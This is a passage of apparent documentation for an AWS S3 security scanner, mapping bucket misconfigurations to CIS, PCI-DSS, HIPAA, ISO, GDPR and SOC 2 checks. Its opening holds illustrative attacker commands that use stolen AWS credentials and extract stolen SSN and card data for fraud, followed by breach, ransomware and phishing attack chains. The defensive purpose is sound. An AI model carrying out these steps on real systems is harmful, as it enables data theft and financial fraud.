export AWS_SECRET_ACCESS_KEY="stolen-secret-key"
aws s3 ls  # Now accessing other resources with stolen creds
```

**Step 4: Identity Theft and Financial Fraud**
```bash
# Process stolen SSN and credit card data
awk -F',' '{print $1","$2","$3}' ./stolen-ssns.csv > ssn-names.txt
awk -F',' '{print $1","$4}' ./stolen-credit-cards.csv > card-data.txt

# Use for identity theft, financial fraud, or sell on dark web
```

---

## Critical Security Implications

### High-Risk Combinations

**1. Public Access + No Encryption + No Logging**
- **Risk:** Massive data breach with no detection or protection
- **Impact:** Complete exposure of sensitive plaintext data
- **Example:** Equifax-style breach with 147 million records exposed

**2. DNS Takeover + Trusted Domain**
- **Risk:** Phishing attacks using legitimate company domains
- **Impact:** High success rate for credential theft and social engineering
- **Example:** Using company.com subdomain for fake login pages

**3. No Versioning + No Backup + Weak Access Controls**
- **Risk:** Permanent data loss from ransomware
- **Impact:** Business disruption, ransom payments, reputation damage
- **Example:** WannaCry-style attacks with permanent data destruction

**4. Permissive CORS + Public Objects + Sensitive Data**
- **Risk:** Browser-based data theft from legitimate users
- **Impact:** Silent data exfiltration during normal web browsing
- **Example:** Users visiting infected websites unknowingly leak corporate data

**5. No Object Lock + Privileged Insider Access**
- **Risk:** Undetectable data manipulation by insiders
- **Impact:** Financial fraud, audit trail destruction, compliance violations
- **Example:** Enron-style financial record manipulation

---

### Compliance Framework Violations

**CIS AWS Foundations Benchmark v3.0.0:**
- **S3.1:** Public access block settings
- **S3.5:** SSL enforcement in bucket policies
- **S3.8:** Overall public access prevention
- **S3.20:** MFA delete for versioned buckets
- **S3.22/S3.23:** Object-level logging

**AWS Foundational Security Best Practices (FSBP):**
- **S3.1:** Block public access settings enabled
- **S3.2:** Block public read access
- **S3.3:** Block public write access
- **S3.5:** SSL enforcement in bucket policies
- **S3.6:** Restrict cross-account access
- **S3.8:** Overall public access prevention
- **S3.9:** Server access logging enabled
- **S3.12:** Avoid ACLs for access management
- **S3.13:** Lifecycle configurations
- **S3.19:** Access points public access blocking
- **S3.24:** Multi-Region Access Points public access blocking

**PCI-DSS v4.0 (AWS Config Rules for Cardholder Data Protection):**
- **S3.1:** S3 buckets should prohibit public access
- **S3.5:** S3 buckets should require requests to use SSL (encryption in transit)
- **S3.8:** S3 buckets should prohibit public read access
- **S3.9:** S3 buckets should have access logging configured (audit logging)
- **S3.15:** S3 buckets should have object lock enabled (audit trail protection)
- **S3.17:** S3 buckets should have server-side encryption enabled (encryption at rest)
- **S3.19:** S3 buckets should prohibit public write access
- **S3.22:** S3 bucket level public access should be prohibited
- **S3.23:** S3 buckets should have versioning enabled (data integrity)
- **S3.24:** S3 buckets should have cross-region replication enabled (backup/DR)

**HIPAA Security Rule (AWS Config Rules for PHI Protection):**
- **s3-bucket-server-side-encryption-enabled:** Server-side encryption for PHI (§164.312(a)(2)(iv))
- **s3-bucket-ssl-requests-only:** Transmission security with SSL enforcement (§164.312(e)(1))
- **s3-bucket-logging-enabled:** Audit controls and access logging (§164.312(b))
- **s3-bucket-public-read-prohibited:** Access control - prohibit public read (§164.312(a)(1))
- **s3-bucket-public-write-prohibited:** Access control - prohibit public write (§164.312(a)(1))
- **s3-bucket-versioning-enabled:** Data backup plan (§164.308(a)(7)(ii)(A))
- **s3-bucket-default-lock-enabled:** Assigned security responsibility (§164.308(a)(1)(ii)(D))

---

### Attack Chain Examples

**Data Breach Attack Chain:**
1. **Reconnaissance:** Subdomain enumeration discovers forgotten S3 buckets
2. **Initial Access:** Exploit public access misconfiguration
3. **Discovery:** Enumerate objects to find sensitive data
4. **Exfiltration:** Download customer data, financial records, PII
5. **Cover Tracks:** Delete access logs (if possible)
6. **Monetization:** Sell data on dark web or demand ransom

**Ransomware Attack Chain:**
1. **Access:** Compromise credentials or exploit public write access
2. **Survey:** Identify critical data and backup locations
3. **Encrypt:** Ransomware encrypts all accessible objects
4. **Destroy:** Delete object versions and backups
5. **Ransom:** Demand payment for decryption keys
6. **Persistence:** Maintain access for future attacks

**DNS Takeover to Phishing Chain:**
1. **Enumeration:** Discover subdomains pointing to S3
2. **Takeover:** Claim orphaned S3 buckets
3. **Content:** Deploy convincing phishing sites
4. **Campaign:** Send phishing emails using trusted domain
5. **Harvest:** Collect credentials and sensitive information
6. **Lateral Movement:** Use stolen credentials to access other systems

**Insider Threat Chain:**
1. **Legitimate Access:** Employee has authorized bucket access
2. **Reconnaissance:** Identify valuable or sensitive data
3. **Exfiltration:** Download data using legitimate credentials
4. **Cover-Up:** Modify or delete audit logs (if no object lock)
5. **Abuse:** Use data for personal gain or competitive advantage
6. **Detection Evasion:** Actions appear legitimate in most monitoring systems

---

## Defense in Depth Strategy

The S3 Security Scanner implements a comprehensive defense-in-depth approach:

**Layer 1: Access Control**
- Public Access Block (primary defense)
- Bucket policies (secondary control)
- Object ACLs (granular control)

**Layer 2: Data Protection**
- Encryption at rest (data confidentiality)
- Encryption in transit (communication security)
- Object versioning (data integrity)

**Layer 3: Monitoring & Compliance**
- Access logging (audit trail)
- Object lock (immutability)
- Lifecycle management (data governance)

**Layer 4: Network Security**
- CORS configuration (browser security)
- DNS takeover prevention (domain integrity)

**Layer 5: Object-Level Security**
- Individual object permissions
- Sensitive data pattern detection
- Public object identification


This multi-layered approach ensures that if one security control fails, others provide backup protection, significantly reducing the risk of successful attacks and data breaches.

---

## ISO Compliance Checks

### ISO 27001:2022 - Information Security Management

**18. ISO 27001 Access Control (5.15)**

**Check Details:**
- **Function:** `check_iso27001_access_control`
- **Description:** Validates least privilege access control implementation
- **Compliance Score:** 0-100% based on access control effectiveness
- **Components Analyzed:**
  - Public access block configuration
  - Bucket policy restrictions
  - ACL permissions
  - Wildcard principal detection
  - Cross-account access controls
  - MFA requirements

**Why This Check is Critical:**
ISO 27001 requires organizations to implement appropriate access controls to protect information assets. This check ensures S3 buckets follow the principle of least privilege.

---

**19. ISO 27001 Access Rights Management (5.18)**

**Check Details:**
- **Function:** `check_iso27001_access_rights`
- **Description:** S3 permission governance assessment
- **Compliance Score:** Based on access control implementation
- **Components Analyzed:**
  - Public access block validation (40 points)
  - Bucket policy safety analysis (30 points)
  - ACL security evaluation (30 points)
  - Compliance threshold: 80% for compliant rating

**Why This Check is Critical:**
Proper access rights management ensures only authorized users can access S3 resources, preventing data breaches and unauthorized access.

---

**20. ISO 27001 Cloud Service Security (5.23)**

**Check Details:**
- **Function:** `check_iso27001_cloud_service_security`
- **Description:** Meta-analysis of cloud security controls
- **Security Score:** Percentage of implemented security controls
- **Controls Evaluated:**
  - Encryption at rest
  - Encryption in transit (SSL/TLS)
  - Access controls
  - Public access blocking
  - Versioning
  - Logging
  - MFA delete
  - Object lock

**Why This Check is Critical:**
ISO 27001 Control 5.23 specifically addresses information security requirements for cloud services, ensuring comprehensive protection.

---

**21. ISO 27001 Cryptography (8.24)**

**Check Details:**
- **Function:** `check_iso27001_cryptography`
- **Description:** Validates use of cryptography for data protection
- **Crypto Score:** Based on encryption implementation
- **Checks Performed:**
  - Server-side encryption configuration
  - SSL/TLS enforcement in bucket policies
  - KMS vs SSE-S3 usage
  - Bucket key enablement

**Why This Check is Critical:**
Proper cryptographic controls are essential for protecting data confidentiality and meeting ISO 27001 requirements.

---

**22. ISO 27001 Information Backup (12.3)**

**Check Details:**
- **Function:** `check_iso27001_backup`
- **Description:** S3 versioning and replication assessment
- **Backup Score:** Based on backup features
- **Components Analyzed:**
  - S3 versioning enablement (60 points)
  - Cross-region replication configuration (40 points)
  - Compliance threshold: 60% for compliant rating

**Why This Check is Critical:**
Proper backup controls ensure data availability and recovery capabilities, essential for business continuity.

---

**23. ISO 27001 Logging and Monitoring (12.4)**

**Check Details:**
- **Function:** `check_iso27001_logging`
- **Description:** S3 access logging and CloudTrail integration
- **Logging Score:** Based on audit trail implementation
- **Components Analyzed:**
  - S3 access logging validation
  - CloudTrail integration recommended
  - Compliance threshold: 70% for compliant rating

**Why This Check is Critical:**
Comprehensive logging enables security monitoring, incident response, and compliance auditing.

---

**24. ISO 27001 Information Transfer (13.2)**

**Check Details:**
- **Function:** `check_iso27001_info_transfer`
- **Description:** S3 secure data transmission validation
- **Transfer Score:** Based on SSL/TLS enforcement
- **Components Analyzed:**
  - SSL/TLS enforcement through bucket policies
  - Secure data transmission validation
  - Binary compliance (compliant/non-compliant)

**Why This Check is Critical:**
Secure data transfer prevents man-in-the-middle attacks and ensures data confidentiality during transmission.

---

### ISO 27017:2015 - Cloud Security Guidelines

**25. ISO 27017 Access Restriction (CLD.6.3.1)**

**Check Details:**
- **Function:** `check_iso27017_access_restriction`
- **Description:** Cloud-specific access management assessment
- **Access Score:** Based on access control implementation
- **Components:**
  - Public access block configuration (50 points)
  - Bucket policy safety analysis (25 points)
  - ACL security evaluation (25 points)
  - Compliance threshold: 75% for compliant rating

**Why This Check is Critical:**
Cloud environments require enhanced access controls due to their distributed nature and shared responsibility model.

---

**26. ISO 27017 Shared Responsibility (CLD.7.1.1)**

**Check Details:**
- **Function:** `check_iso27017_shared_responsibility`
- **Description:** Customer responsibility validation in shared model
- **Responsibility Score:** Based on customer-controlled security features
- **Components:**
  - Encryption enablement assessment
  - Versioning configuration check
  - Logging enablement validation
  - Backup/replication configuration assessment
  - Compliance threshold: 75% for compliant rating

**Why This Check is Critical:**
The cloud shared responsibility model requires customers to properly implement security controls within their scope.

---

**27. ISO 27017 Data Location (CLD.8.1.4)**

**Check Details:**
- **Function:** `check_iso27017_data_location`
- **Description:** Validates data residency and location controls
- **Location Score:** 100% for single region, reduced for multi-region
- **Components:**
  - Primary bucket region identification
  - Cross-region replication analysis
  - Data location tracking
  - Residency compliance validation

**Why This Check is Critical:**
Many regulations require data to remain within specific geographic boundaries. This check ensures compliance with data residency requirements.

---

**28. ISO 27017 Monitoring Activities (CLD.12.1.5)**

**Check Details:**
- **Function:** `check_iso27017_monitoring`
- **Description:** S3 security monitoring and alerting
- **Monitoring Score:** Based on monitoring capabilities
- **Components:**
  - S3 access logging validation (60 points)
  - Event notifications configuration (40 points)
  - Compliance threshold: 60% for compliant rating

**Why This Check is Critical:**
Cloud services require continuous monitoring to detect security incidents and compliance violations.

---

**29. ISO 27017 Cloud Logging (CLD.12.4.1)**

**Check Details:**
- **Function:** `check_iso27017_cloud_logging`
- **Description:** S3 comprehensive audit logging
- **Logging Score:** Based on audit trail implementation
- **Components:**
  - S3 access logging enablement
  - CloudTrail integration recommended
  - Binary compliance (compliant/non-compliant)

**Why This Check is Critical:**
Comprehensive logging provides audit trails essential for security investigations and compliance reporting.

---

**30. ISO 27017 Data Deletion (CLD.13.1.1)**

**Check Details:**
- **Function:** `check_iso27017_data_deletion`
- **Description:** Secure data deletion and lifecycle management
- **Deletion Score:** Based on lifecycle and retention policies
- **Components:**
  - Lifecycle rules configuration (70 points)
  - Versioning enablement for controlled deletion (30 points)
  - Compliance threshold: 70% for compliant rating

**Why This Check is Critical:**
Organizations must be able to securely delete data when required and manage data lifecycle according to policies.

---

**31. ISO 27017 Data Isolation (CLD.13.1.2)**

**Check Details:**
- **Function:** `check_iso27017_data_isolation`
- **Description:** Tenant and data isolation validation
- **Isolation Score:** Based on access control boundaries
- **Components:**
  - Tenant isolation through access controls
  - Public access block validation
  - Cross-account access assessment
  - Policy security evaluation
  - Compliance threshold: 80% for compliant rating

**Why This Check is Critical:**
Proper tenant isolation prevents data leakage between different cloud customers and maintains security boundaries.

---

### ISO 27018:2019 - PII Protection in Cloud

**32. ISO 27018 Purpose Limitation (6.2.1)**

**Check Details:**
- **Function:** `check_iso27018_purpose_limitation`
- **Description:** Purpose-bound access controls validation
- **Purpose Score:** Based on purpose declaration and controls
- **Components:**
  - Purpose declaration through bucket tagging
  - Purpose minimization compliance
  - Access control alignment with purposes
  - Missing purpose declarations identification

**Why This Check is Critical:**
Privacy regulations require that personal data only be used for specific, declared purposes. This prevents scope creep and unauthorized usage.

---

**33. ISO 27018 Data Minimization (6.4.1)**

**Check Details:**
- **Function:** `check_iso27018_data_minimization`
- **Description:** S3 storage optimization and data reduction
- **Minimization Score:** Based on lifecycle implementation
- **Components:**
  - S3 lifecycle rules configuration assessment (85 points)
  - Storage optimization through automated deletion
  - Data reduction capabilities evaluation
  - Compliance threshold: 70% for compliant rating

**Why This Check is Critical:**
Data minimization reduces privacy risks by ensuring only necessary data is stored and retained.

---

**34. ISO 27018 Retention and Deletion (6.5.1)**

**Check Details:**
- **Function:** `check_iso27018_retention_deletion`
- **Description:** Lifecycle and retention management
- **Retention Score:** Based on retention policies
- **Components:**
  - Lifecycle rules configuration (70 points)
  - Versioning enablement for controlled deletion (30 points)
  - Retention management assessment
  - Compliance threshold: 70% for compliant rating

**Why This Check is Critical:**
Proper data retention and deletion ensures compliance with privacy regulations and reduces data exposure risks.

---

**35. ISO 27018 Accountability (8.2.1)**

**Check Details:**
- **Function:** `check_iso27018_accountability`
- **Description:** Data protection accountability measures
- **Accountability Score:** Based on audit trail implementation
- **Components:**
  - S3 access logging enablement (75 points)
  - Data protection accountability through audit trails
  - Compliance threshold: 70% for compliant rating

**Why This Check is Critical:**
Organizations must demonstrate accountability for PII processing through comprehensive audit trails and monitoring.

---

## ISO Compliance Implementation Summary

The S3 Security Scanner implements comprehensive ISO compliance checking across three major standards:

**ISO 27001:2022 (Information Security)**
- 7 controls implemented (78% coverage of S3-relevant controls)
- Focus on access control, cloud security, cryptography, backup, logging, and data transfer
- Provides security scoring and gap analysis

**ISO 27017:2015 (Cloud Security)**
- 7 controls implemented (100% coverage of S3-relevant controls)
- Addresses cloud-specific concerns: access restriction, shared responsibility, data location, monitoring, logging, data deletion, and isolation
- Ensures proper cloud security governance

**ISO 27018:2019 (PII Protection)**
- 4 controls implemented (44% coverage of S3-relevant controls)
- Focuses on privacy: purpose limitation, data minimization, retention/deletion, and accountability
- Critical for GDPR and privacy compliance

These ISO checks complement existing CIS, PCI-DSS, HIPAA, SOC 2, and GDPR compliance frameworks, providing comprehensive security and compliance coverage for S3 buckets.

---

## GDPR (EU) 2016/679 - General Data Protection Regulation Compliance Checks

### GDPR Overview

**What is GDPR?**
The General Data Protection Regulation (GDPR) is a comprehensive data protection law enacted by the European Union in 2018. It establishes strict requirements for the processing of personal data and provides individuals with enhanced rights over their personal information.

**GDPR and S3 Storage:**
While GDPR doesn't define specific technical controls for cloud storage, it establishes principles and requirements that can be implemented through S3 security configurations to protect personal data.

### Article 32 - Security of Processing

**36. GDPR Data Encryption at Rest (G1)**

**Check Details:**
- **Function:** `gdpr_compliance_checker.check_gdpr_compliance_features`
- **Description:** Validates server-side encryption for personal data protection
- **GDPR Article:** Article 32(1)(a) - Pseudonymisation and encryption of personal data
- **Severity:** HIGH

**Why This Check is Critical:**
GDPR Article 32 requires appropriate technical measures including encryption to protect personal data. Unencrypted personal data in S3 violates GDPR requirements and can result in substantial fines.

**Attack Vector When Check Fails:**
```bash
# Personal data exposed in plaintext if bucket is compromised
# GDPR violation: Inadequate technical measures
# Potential fine: Up to 4% of annual global revenue
```

---

**37. GDPR Data Encryption in Transit (G2)**

**Check Details:**
- **Function:** `bucket_policy.ssl_enforced`
- **Description:** Enforces SSL/TLS for all data transfers containing personal data
- **GDPR Article:** Article 32(1)(a) - Pseudonymisation and encryption of personal data
- **Severity:** HIGH

**Why This Check is Critical:**
Personal data transmitted without encryption violates GDPR security requirements and exposes data to interception during transfer.

**Attack Vector When Check Fails:**
```bash
# Man-in-the-middle attacks can intercept personal data
# GDPR violation: Inadequate transmission security
# Risk: Identity theft, privacy violations
```

---

**38. GDPR KMS Key Management (G3)**

**Check Details:**
- **Function:** `kms_key_management.kms_managed`
- **Description:** Validates proper encryption key management practices
- **GDPR Article:** Article 32(1)(a) - Security of processing
- **Severity:** HIGH

**Why This Check is Critical:**
Proper key management ensures encryption remains effective and meets GDPR's requirement for appropriate technical measures.

---

### Article 25 - Data Protection by Design and by Default

**39. GDPR Data Minimization via Lifecycle (G9)**

**Check Details:**
- **Function:** `lifecycle_rules.has_lifecycle_rules`
- **Description:** Automatic deletion of personal data when no longer needed
- **GDPR Article:** Article 25(2) - Data protection by default
- **Severity:** MEDIUM

**Why This Check is Critical:**
GDPR requires data minimization - personal data should not be kept longer than necessary. Lifecycle policies automate compliance with retention requirements.

**Attack Vector When Check Fails:**
```bash
# Accumulation of unnecessary personal data
# GDPR violation: Excessive data retention
# Risk: Increased exposure, storage limitation violations
```

---

**40. GDPR Purpose Limitation (G10)**

**Check Details:**
- **Function:** `gdpr_purpose_limitation.purpose_restricted`
- **Description:** Access controls based on processing purposes
- **GDPR Article:** Article 5(1)(b) - Purpose limitation
- **Severity:** MEDIUM

**Why This Check is Critical:**
Personal data can only be processed for specific, declared purposes. Technical controls should enforce purpose limitations.

---

### Article 30 - Records of Processing Activities

**41. GDPR Audit Logging (G11)**

**Check Details:**
- **Function:** `logging.is_enabled`
- **Description:** Server access logging for personal data access audit trails
- **GDPR Article:** Article 30(1) - Records of processing activities
- **Severity:** HIGH

**Why This Check is Critical:**
GDPR requires organizations to maintain records of processing activities. Access logs provide evidence of lawful processing.

**Attack Vector When Check Fails:**
```bash
# Inability to demonstrate GDPR compliance
# No audit trail for data subject access requests
# Regulatory investigation complications
```

---

**42. GDPR CloudTrail Integration (G12)**

**Check Details:**
- **Function:** `cloudtrail_logging.is_enabled`
- **Description:** Comprehensive API-level audit logging
- **GDPR Article:** Article 30(1) - Records of processing activities
- **Severity:** HIGH

**Why This Check is Critical:**
Detailed API logs help demonstrate compliance with GDPR processing requirements and support data subject rights.

---

### Article 33 - Notification of Data Breach

**43. GDPR Breach Detection (G13)**

**Check Details:**
- **Function:** `event_notifications.has_notifications`
- **Description:** Event notifications for breach detection
- **GDPR Article:** Article 33(1) - Notification of personal data breach
- **Severity:** MEDIUM

**Why This Check is Critical:**
GDPR requires breach notification within 72 hours. Event notifications enable rapid detection and response.

**Attack Vector When Check Fails:**
```bash
# Delayed breach detection
# GDPR violation: Late breach notification
# Penalty: Additional fines for non-compliance
```

---

### Article 17 - Right to Erasure (Right to be Forgotten)

**44. GDPR Data Retention Controls (G15)**

**Check Details:**
- **Function:** `object_lock.is_enabled`
- **Description:** Object lock for legal holds and retention
- **GDPR Article:** Article 17(1) - Right to erasure
- **Severity:** MEDIUM

**Why This Check is Critical:**
Balanced approach - protect data from unauthorized deletion while enabling lawful erasure requests.

---

**45. GDPR Cross-Region Compliance (G16)**

**Check Details:**
- **Function:** `gdpr_replication_compliance.all_regions_compliant`
- **Description:** GDPR compliance across all replication regions
- **GDPR Article:** Article 17(1) - Right to erasure across all systems
- **Severity:** MEDIUM

**Why This Check is Critical:**
Erasure requests must be honored across all data copies and replicated regions to comply with GDPR.

---

### Article 44-49 - International Data Transfers

**46. GDPR Data Residency (G18)**

**Check Details:**
- **Function:** `gdpr_data_residency.compliant_region`
- **Description:** Bucket location compliance with data residency
- **GDPR Article:** Article 44 - General principle for transfers
- **Severity:** HIGH

**Why This Check is Critical:**
Personal data must remain within the EU/EEA unless adequate safeguards are in place for international transfers.

**Attack Vector When Check Fails:**
```bash
# Unauthorized international data transfer
# GDPR violation: Inadequate transfer safeguards
# Risk: Regulatory action, transfer suspension
```

---

**47. GDPR International Transfer Restrictions (G19)**

**Check Details:**
- **Function:** `gdpr_international_transfers.compliant_transfers`
- **Description:** Validation of cross-border data transfers
- **GDPR Article:** Article 45 - Transfers on basis of adequacy decision
- **Severity:** HIGH

**Why This Check is Critical:**
International transfers require adequate safeguards or adequacy decisions to comply with GDPR.

---

### Additional GDPR Technical Safeguards

**48. GDPR Transfer Acceleration Security (G21)**
- **Check:** Secure configuration of S3 Transfer Acceleration
- **Risk Level:** LOW
- **Purpose:** Ensure acceleration doesn't bypass security controls

**49. GDPR CORS Security (G22)**
- **Check:** CORS configuration doesn't expose personal data
- **Risk Level:** MEDIUM  
- **Purpose:** Prevent browser-based personal data leaks

**50. GDPR Website Hosting Security (G23)**
- **Check:** Static website hosting security for personal data
- **Risk Level:** MEDIUM
- **Purpose:** Secure hosting when serving personal data

**51. GDPR Data Inventory (G24)**
- **Check:** S3 Inventory for personal data tracking
- **Risk Level:** LOW
- **Purpose:** Support data mapping and inventory requirements

**52. GDPR Analytics Security (G25)**
- **Check:** Analytics configuration security for personal data
- **Risk Level:** LOW
- **Purpose:** Prevent inappropriate insights exposure

### GDPR Implementation Strategy

**Step 1: Data Classification**
```bash
# Identify buckets containing personal data
# Apply appropriate GDPR tags
aws s3api put-bucket-tagging --bucket personal-data-bucket \
  --tagging 'TagSet=[{Key=DataType,Value=PersonalData},{Key=GDPRScope,Value=ArticleProcessing}]'
```

**Step 2: Implement Core Security Controls**
```bash
# High-priority GDPR controls (G1, G2, G4, G5, G11, G18, G19)
s3-security-scanner --compliance-only | grep "GDPR.*HIGH"

# Must pass for baseline GDPR compliance
```

**Step 3: Configure Data Lifecycle**
```bash
# Medium-priority controls (G6, G7, G9, G10, G12, G13, G15, G16)
# Implement data minimization and retention policies
```

**Step 4: Monitor and Maintain**
```bash
# Regular compliance checks
s3-security-scanner --bucket personal-data-bucket --compliance-only
```

### GDPR Compliance Assessment

**Technical Implementation: 18/25 controls (72%)**
- Implementable via S3 APIs and configurations
- Direct technical measures for data protection
- Automated compliance monitoring

**External Dependencies: 7 controls require additional services**
- Data classification (Amazon Macie)
- Security monitoring (AWS GuardDuty)  
- Application-level data portability
- Organizational DPIA processes

**GDPR Beyond S3:**
- Data Subject Rights management
- Consent management systems
- Privacy by design architecture
- Data Protection Officer processes
- Legal basis documentation

### Real-World GDPR Compliance Scenarios

**Scenario 1: E-commerce Platform**
```bash
# Customer data in S3
# Required: G1, G2, G4, G5, G9, G11, G18 (mandatory)
# Optional: G13, G15, G16 (enhanced protection)
```

**Scenario 2: Healthcare Data Processing**
```bash
# Health data (special category)
# Required: All HIGH severity controls
# Enhanced: All MEDIUM severity controls
# Monitoring: Real-time breach detection
```

**Scenario 3: Multi-National Corporation**
```bash
# Complex transfer scenarios
# Critical: G18, G19 (data residency)
# Essential: G16 (cross-region compliance)
# Required: Standard Contractual Clauses
```

### GDPR Violation Risks and Penalties

**Administrative Fines:**
- **Tier 1:** Up to €10 million or 2% of annual global revenue
- **Tier 2:** Up to €20 million or 4% of annual global revenue

**Common S3-Related Violations:**
- Unencrypted personal data storage (G1, G2)
- Unauthorized international transfers (G18, G19)
- Inadequate access controls (G4, G5)
- Missing audit trails (G11, G12)
- Excessive data retention (G9)

---

## SOC 2 Type II - Trust Service Criteria Compliance Checks

### SOC 2 Overview

**What is SOC 2?**
SOC 2 (Service Organization Control 2) is a flexible compliance framework developed by the AICPA for service organizations to demonstrate security controls over customer data. Unlike fixed frameworks, SOC 2 allows organizations to choose which Trust Service Criteria (TSC) to implement based on their business needs.

**Trust Service Criteria:**
- **Security (CC)** - *Mandatory for all SOC 2 engagements*
- **Availability (A)** - *Optional*
- **Confidentiality (C)** - *Optional*
- **Processing Integrity (PI)** - *Optional*
- **Privacy (P)** - *Optional*

### SOC 2 Security (CC) - Mandatory Controls

**AWS S3 Controls Supporting Security Criteria:**

**SOC2-CC-ENCRYPTION-REST (TSC CC6.6 - Data Encryption)**
- **Check:** Server-side encryption enabled for all S3 buckets
- **Why Critical:** Protects customer data at rest from unauthorized access
- **Risk:** Compliance violations, data breaches, regulatory fines

**SOC2-CC-ENCRYPTION-TRANSIT (TSC CC6.6 - Data Encryption)**
- **Check:** SSL/TLS enforcement through bucket policies
- **Why Critical:** Protects data in transit from interception
- **Risk:** Man-in-the-middle attacks, data exposure

**SOC2-CC-ACCESS-CONTROL (TSC CC6.1 - Logical Access)**
- **Check:** Proper access controls and public access blocking
- **Why Critical:** Ensures only authorized users access customer data
- **Risk:** Unauthorized data access, data leaks

**SOC2-CC-MFA-REQUIREMENTS (TSC CC6.2 - User Authentication)**
- **Check:** Multi-factor authentication for sensitive operations
- **Why Critical:** Strengthens authentication for critical systems
- **Risk:** Account compromise, insider threats

**SOC2-CC-AUDIT-LOGGING (TSC CC7.2 - Security Events)**
- **Check:** Access logging enabled for security monitoring
- **Why Critical:** Provides audit trail for security investigations
- **Risk:** Inability to detect breaches, compliance violations

**SOC2-CC-KEY-MANAGEMENT (TSC CC6.8 - Encryption Key Management)**
- **Check:** Proper KMS key management practices
- **Why Critical:** Ensures encryption keys are properly managed
- **Risk:** Key compromise, encryption bypass

### SOC 2 Availability (A) - Optional Controls

**SOC2-A-BACKUP-RECOVERY (TSC A1.2 - Backup Infrastructure)**
- **Check:** Versioning enabled for data recovery
- **Why Important:** Ensures system availability during failures
- **Business Impact:** Service downtime, data loss

**SOC2-A-REPLICATION (TSC A1.2 - Recovery Infrastructure)**
- **Check:** Cross-region replication for disaster recovery
- **Why Important:** Maintains availability during regional outages
- **Business Impact:** Extended downtime, customer dissatisfaction

**SOC2-A-MONITORING (TSC A1.3 - System Monitoring)**
- **Check:** CloudWatch monitoring configured
- **Why Important:** Proactive monitoring prevents service degradation
- **Business Impact:** Undetected performance issues

### SOC 2 Confidentiality (C) - Optional Controls

**SOC2-C-DATA-PROTECTION (TSC CC6.7 - Data Transmission)**
- **Check:** Confidential data access protection
- **Why Important:** Protects sensitive customer information
- **Business Impact:** Data privacy violations, trust erosion

### SOC 2 Processing Integrity (PI) - Optional Controls

**SOC2-PI-DATA-INTEGRITY (TSC CC8.1 - Data Integrity)**
- **Check:** Object lock enabled for data integrity
- **Why Important:** Ensures data hasn't been tampered with
- **Business Impact:** Data corruption, processing errors

### SOC 2 Privacy (P) - Optional Controls

**SOC2-P-DATA-GOVERNANCE (TSC P2.1 - Data Management)**
- **Check:** Storage Lens for data governance
- **Why Important:** Demonstrates proper data lifecycle management
- **Business Impact:** Privacy violations, regulatory non-compliance

### SOC 2 Implementation Strategy

**Step 1: Determine Required TSC**
```bash
# Organizations must choose which criteria apply to their business
# Security (CC) is always mandatory
# A, C, PI, P are selected based on:
# - Customer requirements
# - Industry regulations
# - Business model
# - Risk assessment
```

**Step 2: Implement Baseline Security Controls**
```bash
# All 6 Security (CC) controls must pass for SOC 2 compliance
s3-security-scanner --compliance-only | grep "SOC2-CC"

# Example output:
# SOC2-CC-ENCRYPTION-REST: Passed
# SOC2-CC-ENCRYPTION-TRANSIT: Passed
# SOC2-CC-ACCESS-CONTROL: Passed
# SOC2-CC-MFA-REQUIREMENTS: Failed
# SOC2-CC-AUDIT-LOGGING: Passed
# SOC2-CC-KEY-MANAGEMENT: Passed
```

**Step 3: Implement Selected Optional Controls**
```bash
# If Availability is selected, implement A controls
s3-security-scanner --compliance-only | grep "SOC2-A"

# If Confidentiality is selected, implement C controls  
s3-security-scanner --compliance-only | grep "SOC2-C"

# If Processing Integrity is selected, implement PI controls
s3-security-scanner --compliance-only | grep "SOC2-PI"

# If Privacy is selected, implement P controls
s3-security-scanner --compliance-only | grep "SOC2-P"
```

### SOC 2 Compliance Assessment

**Variable Compliance Model:**
Unlike fixed frameworks (CIS, PCI-DSS), SOC 2 compliance percentage varies based on:

1. **Selected Trust Service Criteria** - Organizations choose A, C, PI, P
2. **Implementation Scope** - Not all controls may apply 
3. **Risk Assessment** - Control priority based on business risk

**Assessment Formula:**
```
SOC 2 Compliance = (Security CC Score × 100%) + (Optional Criteria Score × Variable Weight)

Where:
- Security (CC): Mandatory 6/6 controls = 100% required
- Optional Criteria: Variable based on selection
- Overall Score: Weighted average of implemented criteria
```

**Example Compliance Scenarios:**

**Scenario 1: SaaS Company (Security + Availability)**
- Security (CC): 6/6 controls = 100% (Mandatory)
- Availability (A): 3/3 controls = 100% (Selected)
- Overall: 100% compliant for selected criteria

**Scenario 2: Data Processing Service (Security + Privacy + Processing Integrity)**
- Security (CC): 5/6 controls = 83% (Failed MFA)
- Privacy (P): 1/1 controls = 100% (Selected)
- Processing Integrity (PI): 1/1 controls = 100% (Selected)
- Overall: 83% compliant (Must fix Security to achieve compliance)

**Scenario 3: Cloud Storage Provider (All Criteria)**
- Security (CC): 6/6 controls = 100%
- Availability (A): 2/3 controls = 67%
- Confidentiality (C): 1/1 controls = 100%
- Processing Integrity (PI): 1/1 controls = 100%
- Privacy (P): 1/1 controls = 100%
- Overall: 95% compliant

### SOC 2 Real-World Implementation

**Cloud Service Provider Example:**
```bash
# Assessment shows need for all TSC due to customer requirements
# Priority 1: Fix mandatory Security controls
aws s3api put-bucket-policy --bucket production-data \
  --policy file://mfa-required-policy.json

# Priority 2: Implement selected optional controls
aws s3api put-bucket-versioning --bucket production-data \
  --versioning-configuration Status=Enabled

# Priority 3: Validate compliance
s3-security-scanner --bucket production-data --compliance-only
```

**Key SOC 2 Benefits:**
- **Customer Trust:** Demonstrates security maturity to enterprise customers
- **Competitive Advantage:** Required for many B2B sales processes
- **Risk Management:** Systematic approach to security controls
- **Flexibility:** Choose criteria that match business model
- **Audit Readiness:** Structured evidence collection for SOC 2 reports

---

*This documentation demonstrates the critical importance of each security check performed by the S3 Security Scanner. Regular scanning and remediation of identified issues is essential for maintaining a strong security posture and preventing the attack scenarios described above.*
